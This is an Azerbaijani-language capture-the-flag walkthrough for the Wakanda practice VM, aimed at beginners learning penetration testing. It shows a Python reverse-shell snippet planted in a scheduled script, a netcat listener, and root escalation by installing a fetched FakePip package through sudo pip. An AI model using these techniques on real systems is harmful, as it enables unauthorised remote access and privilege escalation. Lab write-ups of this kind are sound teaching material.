...
Bu, çətin VM deyil və yaradıcı tərəfindən orta səviyyəli olaraq sıralanır. Beləliklə, bu yazı yeni başlayanlar və əlbəttə hackerlik və pentest haqqında daha çox öyrənmək istəyənlər üçündür. Sizə lazım olan tək şey Wakanda VM və Kali Linux-dur

![Wakanda](https://i.imgur.com/0ViToK8.png)

- Açıqlama hissəsinə nəzər salsaq görərik ki 3 dənə flag-imiz var.
...
- Bu fayl içərisində 1 sətir kod var və bu kod (yazmaq üçün) `/tmp/test` faylını açır və içərisinə test yazır. Bu çox ehtimal ki, işə salınıb çünki biz bəyaq baxanda test yazılmışdı.



 - İndi isə `.antivirus.py` faylının içinə reverse shell əlavə edəcəyik.
 - Nano ilə faylı açıb kodu içərisinə əlavə edirik. (internetdə Python reverse shell cheet sheet yazaraq sizdə bunun kimi kod reverse shell kodu tapa bilərsiniz.)

- Bu saytda bir çox dildə istifadə edilən Reverse shell-lər var [sayt link](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
...
s.connect(("0.0.0.0",1234))    ///burada olan 0.0.0.0 yerinə öz lokal ip adresinizi yazın
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
...
- Daha sonra isə digər bir pəncərədə netcat ilə (və ya metasplotable ilə də edə bilərik) 1234 portunu dinləməyə alırıq.
```
nc -nvlp 1234
```

- Gördüyünüz kimi Reverse shell bağlantısı alindi amma yenə də `mamadou` istifadəçisi kimi görünür 

![wakanda17](https://i.imgur.com/tozVWfR.jpg)

- CTRL+C edib yenidən dinləməyə alaq.
> Sözün düzü bir neçə yol yoxladım reboot etməyə çalışdım və ya başqa yollar və necəsə reverse shell yenidən bağlandı.

![wakanda18](https://i.imgur.com/aadI6vy.jpg)

- Çox ehtimal ki, bu arxa fonda necəsə hər 1dəq bir öz özünə işə salınır.

- Yəqin ki, bizim işimiz reverse shell yazdıqdan sonra sadəcə dinləməyə alıb gözləməkimiş.


İndi isə flag2.txt oxuya bilərik.

![wakanda19](https://i.imgur.com/HYX0Y9M.jpg)

İndi isə `root` olmalıyıq.

- Bunun üçün `sudo -l` əmrindən istifadə edəcyik.

- Burada biz devops istifadəçisi olaraq `/usr/bin/pip` işə sala bilirik.

![wakanda20](https://i.imgur.com/oCWhaNI.png)

- Bir qədər araşdırdım ki, bu pip ilə nələr edə bilərik (/usr/bin/pip exploit sudo). Qarşıma [Fake Pip](https://github.com/0x00-0x00/FakePip) deyə bir şey çıxdı.
- Fake pip istifadə edərək biz özümüzü root istifadəçisi kimi müəyyən etməyimiz üçün yazılan bir koddur.
- Github linkində olan setup.py faylına daxil oluruq

![wakanda21](https://i.imgur.com/hFcBsVM.png)

- içərisini kopy edib bir not dəftərində açırıq.

![wakanda22](https://i.imgur.com/csh6cZU.png)


- change this yazılan yerə öz lokal İp adresinizi yazırsınız.

![wakanda23](https://i.imgur.com/133bUZF.png)

- bu faylı `/var/www/html` directorysinə kopy edib apache2 serverini işə salırıq.

![wakanda24](https://i.imgur.com/noIQhXh.png)

- wget vasitəsilə faylı əldə edirik.

![wakanda25](https://i.imgur.com/MEnbRGt.png)

- Kali linux da isə bu portu dinləməyə alırıq( bu port setup.py faylının içində qeyd edilmişdi)

![wakanda27](https://i.imgur.com/kCVv1e8.png)

- Faylı işə salmaq üçün isə bu koddan sitifadə edirik.
```
sudo /usr/bin/pip install . --upgrade --force-reinstall
```

![wakanda26](https://i.imgur.com/iDZxsPE.png)

- Və artıq root istifadəçisi olduq

![wakanda28](https://i.imgur.com/oU4bEHW.png)


- Ənənəyə sadiq qalaraq root flagini də oxuyaq.


![wakanda30](https://i.imgur.com/0rczQcx.png)